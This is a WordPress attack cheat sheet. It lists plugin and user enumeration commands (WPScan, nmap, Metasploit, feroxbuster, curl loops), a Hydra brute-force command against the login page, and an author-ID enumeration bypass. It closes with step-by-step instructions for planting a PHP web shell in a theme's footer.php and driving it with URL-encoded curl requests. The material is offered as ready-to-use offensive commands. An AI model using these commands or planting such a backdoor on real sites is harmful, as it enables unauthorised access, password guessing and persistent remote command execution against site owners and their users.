### **INTRODUCTION**

WordPress is an open-source content management system (CMS) that enables users to create, manage, and modify content on a website without needing specialized technical knowledge. Originally launched in 2003 as a platform primarily for blogging, WordPress has evolved into a robust tool for building various types of websites, from simple blogs to comprehensive business sites and online stores.

### **PLUGIN ENUMERATION TECHNIQUES**

Vulnerable plugins are a primary attack vector in WordPress and represent a significant security risk.

1.  Enumerating Plugins with WPScan:  
    `wpscan --url https://[WORDPRESS-DOMAIN]/ -e vp --plugins-detection aggressive`
    
2.  Identifying Plugins with a Custom Bash Script:
    
    ```bash
    for plugin in $(cat pluginlist.txt); do 
      response=$(curl -s -o /dev/null -w "%{http_code}" https://[WORDPRESS-DOMAIN]/wp-content/plugins/$plugin/)
      if [[ "$response" -eq 200 ]]; then 
        echo "Plugin found: $plugin"; 
      fi; 
    done
    ```
    
3.  Detecting Plugins with Nmap Scripts:  
    `nmap -sV --script http-wordpress-plugins https://[WORDPRESS-DOMAIN]/`
    
4.  Scanning Plugins with Metasploit:  
    `auxiliary/scanner/http/wordpress_plugins`
    
5.  Brute Forcing Plugin Paths with Feroxbuster:  
    `feroxbuster -u https://[WORDPRESS-DOMAIN]/wp-content/plugins -w plugins.txt`
    

### **USER ENUMERATION TECHNIQUES**

1.  Enumerating Users with a Bash Script:
    
    ```bash
    for i in {1..100}; do 
       curl -s -L -i https://[WORDPRESS-DOMAIN]/wordpress?author=$i | grep -E -o "Location:.*" | awk -F/ '{print $NF}'; 
    done
    ```
    
2.  Bypassing Restrictions for User Enumeration:  
    `http://[WORDPRESS-DOMAIN]/?x&author=1`
    
3.  Brut-forcing Usernames with Hydra:  
    `hydra -L userlist.txt -p test "https://[WORDPRESS-DOMAIN]/" http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"`
    
4.  Scanning Users with WPScan:  
    `wpscan --url https://[WORDPRESS-DOMAIN]/ --enumerate u`
    
5.  Enumerating Users with Metasploit:  
    `use auxiliary/scanner/http/wordpress_enum_users`
    

### **WPSCAN COMMANDS**

1.  Performing a Comprehensive Website Scan:  
    `wpscan --rua -e ap,at,tt,cb,dbe,u,m --url https://[WORDPRESS-DOMAIN]/ --plugins-detection aggressive --api-token [API-TOKEN] --passwords /usr/share/seclists/Passwords/probable-v2-top1575.txt`
    
2.  Conducting a Detailed Vulnerability Scan:  
    `wpscan --url https://[WORDPRESS-DOMAIN]/ --enumerate vp,u,vt,tt --follow-redirection --verbose --log target.log`
    

### **INJECTING A SHELL INTO A WORDPRESS THEME**

To establish a reverse shell through a WordPress theme, you modify theme files to execute arbitrary system commands. This can be done by adding PHP code to template files like `404.php` or `footer.php`. Follow these detailed steps to implement and use a reverse shell:

1.  Choose a template file within the WordPress theme that is accessed frequently. For example, `footer.php` is included on every page, making it a good place.
    
2.  Insert the following PHP code at the top of the file:  
    `<?php system($_GET['hackfast']); ?>`
    
3.  Replace the original file with your modified version on your WordPress server. Make sure you back up the original file first in case you need to restore it later.
    
4.  To execute commands, Access the modified file through a browser or use a command-line tool like curl:  
    `curl -s 'https://[WORDPRESS-DOMAIN]/path/to/modified/template?hackfast=[URL_ENCODED_COMMAND]'`
    
5.  URL encode your commands to ensure they are interpreted correctly by the server. For instance, spaces are represented as `%20` and pipes `|` as `%7C`.
    
6.  Here an example of encoding and executing the command `id | grep uid | cut -f4 -d">"`:  
    `curl -s https://[WORDPRESS-DOMAIN]/path/to/modified/template?hackfast=id%20%7C%20grep%20uid%20%7C%20cut%20-f4%20-d%22%3E%22`
    